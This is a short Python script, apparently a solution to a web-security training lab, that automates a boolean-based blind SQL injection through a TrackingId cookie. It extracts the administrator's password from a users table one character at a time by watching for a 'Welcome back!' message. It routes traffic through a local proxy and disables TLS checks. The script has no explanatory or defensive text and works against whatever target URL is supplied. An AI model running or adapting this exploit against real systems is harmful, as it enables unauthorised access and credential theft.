#!/usr/bin/python3

import requests, string, sys, argparse
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

proxies = {
    'http':'http://127.0.0.1:8080', 
    'https':'http://127.0.0.1:8080',
    }
s = requests.Session()

def arg_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', help='Base URL to target', required = True)
    parser.add_argument('-l','--length', help='Max length of password', required=True)
    parser.add_argument('-s','--session', help='Session cookie', required = True)
    parser.add_argument('-i','--tracking', help='TrackingId cookie', required=True)
    args = parser.parse_args()
    return args

def inject(target, length, sess, tracking):
    password_extracted = ""
    for i in range (1, int(length) + 1):
        for j in range(32, 126):
            cookies = {
                "session" : f"{sess}",
                "TrackingId" : f"{tracking}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{i},1) = '{chr(j)}",
                }
            r = requests.get(target, cookies=cookies, proxies=proxies, verify=False)
            if "Welcome back!" not in r.text:
                sys.stdout.write(f"\r[+] Password: {password_extracted} {chr(j)}")
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write(f"\r[+] Password: {password_extracted}")
                sys.stdout.flush()
                break

def main():
    args = arg_parser()
    target = args.target
    length = args.length
    sess = args.session
    tracking = args.tracking
    inject(target, length, sess, tracking)

if __name__ == '__main__':
    main()